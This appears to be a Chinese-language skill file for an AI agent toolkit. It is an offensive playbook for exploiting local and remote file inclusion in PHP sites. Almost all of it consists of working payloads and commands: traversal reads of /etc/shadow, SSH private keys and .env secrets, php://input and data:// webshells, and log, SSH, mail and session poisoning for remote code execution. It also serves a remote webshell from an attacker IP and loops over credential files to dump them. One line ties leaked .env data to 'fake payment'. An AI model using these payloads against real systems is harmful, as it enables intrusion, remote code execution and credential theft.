---
name: 开卷
description: >-
 本地/远程文件包含漏洞（LFI/RFI）：路径遍历、PHP 伪协议利用、日志投毒 RCE、
 /proc/self/fd、session 文件包含、RFI 远程 WebShell。
 
version: 1.0.0
---

# LFI/RFI 文件包含漏洞

## 作业入口（先跑这个）

```bash
python3 炼蛊房/tpl_inject_probe.py lfi --url 'https://授权/?file=1' --param file --case <案>
```

L2（passwd / php://filter `PD9waH`）成立后再用下面伪协议深挖。`.env` 命中回灌假支付。  
Vite `@fs` 走 `vite-fs-read`，不要当通用 LFI。  
作业手法：`传承/开卷.md`

## 触发条件

：
- LFI、本地文件包含、文件包含漏洞
- RFI、远程文件包含
- 路径遍历、目录穿越、../../etc/passwd
- php://filter、php://input、data://
- 日志投毒、log poisoning
- /proc/self/fd、session 包含

---

## 1. 基础检测

```bash
# Linux 系统文件读取
/etc/passwd
/etc/shadow
/etc/hosts
/etc/nginx/nginx.conf
/var/www/html/index.php
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0

# 路径遍历测试
?file=../../etc/passwd
?file=....//....//etc/passwd # 双写绕过
?file=%2e%2e%2f%2e%2e%2fetc/passwd # URL 编码
?file=..%252f..%252fetc%252fpasswd # 双重编码
?file=....\/....\/etc\/passwd # 混合斜线

# 截断（旧版 PHP < 5.3.4）
?file=../../etc/passwd%00 # Null byte
?file=../../etc/passwd.png # 后缀绑定
```

---

## 2. PHP 伪协议

### 2.1 php://filter（读取源码）

```bash
# 读取当前文件 Base64 编码
?file=php://filter/convert.base64-encode/resource=index.php

# 读取配置文件
?file=php://filter/convert.base64-encode/resource=/etc/passwd
?file=php://filter/convert.base64-encode/resource=../config.php

# 解码
echo "base64内容" | base64 -d

# ROT13 编码（有时用于绕过）
?file=php://filter/read=string.rot13/resource=index.php

# 链式过滤器（读取二进制文件）
?file=php://filter/convert.base64-encode|convert.base64-encode/resource=index.php
```

### 2.2 php://input（写入/执行代码）

```bash
# POST 请求体即为包含的内容
curl -X POST "http://target.com/?file=php://input" \
 --data '<?php system($_GET["cmd"]); ?>' \
 "http://target.com/?file=php://input&cmd=id"

# 配合 allow_url_include=On，php.ini 开启时有效
```

### 2.3 data:// 协议

```bash
# data://text/plain（base64）
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# 明文
?file=data://text/plain,<?php system('id'); ?>
```

### 2.4 phar:// 协议（配合文件上传）

```bash
# 先上传一个包含 PHP Payload 的 phar（可伪装成 zip/jpg）
# 然后包含：
?file=phar:///var/www/html/uploads/evil.jpg/evil.php
```

### 2.5 zip:// 协议

```bash
# 上传含 shell.php 的 zip，包含其中的文件
?file=zip:///var/www/html/uploads/evil.zip%23shell.php
```

---

## 3. 日志投毒 RCE（Log Poisoning）

### 3.1 Apache 访问日志

```bash
# 1. 查找日志路径（LFI 读取）
?file=../../../../var/log/apache2/access.log
?file=../../../../var/log/nginx/access.log
?file=../../../../var/log/httpd/access.log

# 2. 把 PHP 代码注入 User-Agent 或路径
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# 或通过路径（GET 请求中的路径会被记录）
curl "http://target.com/<?php system(\$_GET['cmd']); ?>"

# 3. 包含日志执行
?file=../../../../var/log/apache2/access.log&cmd=id
```

### 3.2 SSH 授权日志

```bash
# 1. 用含 PHP 代码的用户名尝试 SSH 登录（失败也会记日志）
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# 2. 包含 /var/log/auth.log
?file=../../../../var/log/auth.log&cmd=id
```

### 3.3 Mail 日志 / sendmail

```bash
# SMTP 投毒
telnet target.com 25
MAIL FROM: <?php system($_GET['c']); ?>
RCPT TO: admin@target.com
DATA ...

# 包含
?file=../../../../var/mail/www-data&c=id
```

---

## 4. /proc/self/fd — 文件描述符包含

```bash
# 当访问日志路径不确定时，通过 fd 枚举找到日志文件
# fd/0 = stdin, fd/1 = stdout, fd/2 = stderr, fd/5+ 可能是访问日志

for i in $(seq 0 20); do
 curl -s "http://target.com/?file=../../../../proc/self/fd/$i" | head -3
done

# 找到后：注入 PHP → 包含对应 fd
# UA 投毒 → 包含 /proc/self/fd/7（假设是 apache 日志）
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/?file=../../../../proc/self/fd/7&cmd=id"
```

---

## 5. PHP Session 文件包含

```bash
# 默认 session 路径
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
/var/lib/php/sess_<PHPSESSID>

# 1. 登录/访问，让 session 被创建，PHPSESSID 从 Cookie 获取

# 2. 向 session 中写入 PHP 代码（通过可控 session 参数）
GET /page?name=<?php system($_GET['cmd']); ?> HTTP/1.1
Cookie: PHPSESSID=abc123def456

# 3. 包含 session 文件
?file=../../../../var/lib/php/sessions/sess_abc123def456&cmd=id
```

---

## 6. RFI（远程文件包含）

```bash
# 条件：php.ini 中 allow_url_include = On（PHP 5.2 前默认开，现在少见）

# 1. 在攻击机 HTTP 服务器上放 PHP WebShell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.txt
python3 -m http.server 80

# 2. 包含远程文件
?file=http://攻击机IP/shell.txt&cmd=id
?file=https://攻击机IP/shell.txt&cmd=id
?file=\\攻击机IP\share\shell.txt # UNC 路径（Windows）

# SMB RFI（Windows 目标）
impacket-smbserver share /tmp/webshells/ -smb2support
?file=\\攻击机IP\share\shell.php
```

---

## 7. 自动化工具

```bash
# LFISuite（自动利用）
git clone https://github.com/D35m0nd142/LFISuite
python2 LFISuite.py

# kadimus（自动扫描 + 利用）
git clone https://github.com/P0cL4bs/Kadimus
./kadimus -u "http://target.com/?file=INJECT" -t lfi

# ffuf（爆破路径深度）
ffuf -u "http://target.com/?file=FUZZ" \
 -w lfi_payloads.txt -mr "root:x:0:0"

# nuclei LFI 模板
nuclei -l targets.txt -t ~/nuclei-templates/vulnerabilities/generic/lfi.yaml
```

---

## 8. 读取后进一步利用

```bash
# 读到 /etc/passwd → 枚举用户 → 尝试 SSH 弱口令
# 读到 .env / config.php → 找数据库密码、API KEY
# 读到 /proc/self/environ → 找环境变量中的密钥
# 读到 SSH 私钥 → /home/user/.ssh/id_rsa → SSH 直接登录

# php://filter 读取所有敏感文件
for f in config.php config/database.php .env app/config/parameters.yml; do
 echo "=== $f ===" && curl -s "http://target/?file=php://filter/convert.base64-encode/resource=$f" | base64 -d
done
```

---

## 快速测试流程

```
1. 找参数（?file= ?page= ?include= ?path= ?template= ?lang=）
2. 测 ../../etc/passwd（看到 root:x 确认 LFI）
3. 尝试 php://filter 读源码
4. 日志路径尝试 → UA 投毒 → 包含 = RCE
5. 找不到日志 → 枚举 /proc/self/fd/0-30
6. Session 文件投毒（若有可控 session 参数）
7. 有上传功能 → phar:// / zip:// 转换为 RCE
```

配套：`file-upload-webshell` · `php-debug-mode-exploitation` · `evasion`

## 真源

- 手法：`传承/开卷.md`
- 工具：`python3 炼蛊房/tpl_inject_probe.py lfi --help`
- 广谱：`python3 炼蛊房/core_web_surface_probe.py --help`
